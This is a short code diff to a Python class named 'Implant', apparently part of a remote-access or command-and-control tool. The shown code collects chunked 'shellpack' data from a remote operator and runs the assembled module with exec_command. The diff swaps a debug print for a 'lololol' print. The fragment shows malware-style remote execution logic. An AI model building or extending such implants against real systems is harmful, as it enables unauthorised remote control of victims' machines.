@@ -69,14 +69,13 @@ class Implant(Host):
             return
 
         decoded_data = shellpack['data'].decode()
-        
-        print(decoded_data)
 
         match shellpack['option']:
             case "TRUNCATED":
                 self.module_cache += decoded_data
             case "COMPLETED":
                 self.module_cache += decoded_data
+                print("lololol")
                 self.exec_command(self.module_cache)
                 self.module_cache = """"""
             case _:
